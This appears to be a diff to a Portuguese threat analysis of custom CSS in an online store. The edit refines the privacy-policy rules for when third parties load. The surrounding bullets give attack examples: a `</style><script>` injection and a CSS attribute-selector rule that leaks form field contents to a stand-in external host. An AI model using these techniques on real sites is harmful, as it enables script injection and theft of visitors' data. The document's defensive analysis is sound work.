@@ -43,7 +43,7 @@ O CSS esconde ou disfarça, sem mudar uma linha do texto, o que a página **tem*
 
 - **Fuga do bloco de estilo:** um CSS posto dentro de `<style>` sem tratamento pode conter `</style><script>…`. É injeção de HTML e de script na página da loja e no checkout embutido.
 - **Exfiltração por seletores:** regras como `input[value^="a"] { background: url(https://exemplo.invalido/a) }` vazam, letra por letra, o que está num campo da página (um e-mail digitado, um token de formulário) para um servidor de fora, sem script nenhum.
-- **Carga de terceiros sem consentimento:** `url()`, `@import` e `@font-face` com endereço de fora fazem o navegador de **todo visitante** chamar outro servidor, que recebe o IP e o navegador. A política de privacidade (`app/privacy/page.tsx`, seção dos pixels) só admite terceiros com o consentimento de medição do visitante. CSS com recurso externo contornaria isso.
+- **Carga de terceiros sem consentimento:** `url()`, `@import` e `@font-face` com endereço de fora fazem o navegador de **todo visitante** chamar outro servidor, que recebe o IP e o navegador. A política de privacidade (`app/privacy/page.tsx`, seção dos pixels) decide quando terceiros carregam: no EEE, no Reino Unido, na Suíça, no Brasil e em país desconhecido, só com o consentimento de medição do visitante; nos demais lugares, os pixels carregam, salvo se o navegador enviar Global Privacy Control. CSS com recurso externo contornaria essa escolha nos dois casos.
 - **Sobreposição enganosa:** `position: fixed` com `z-index` alto põe por cima do checkout ou do botão de pagar um elemento que parece da página. É o mesmo efeito de um clickjacking, feito de dentro.
 
 ### 2.4 Suporte, desempenho e custo
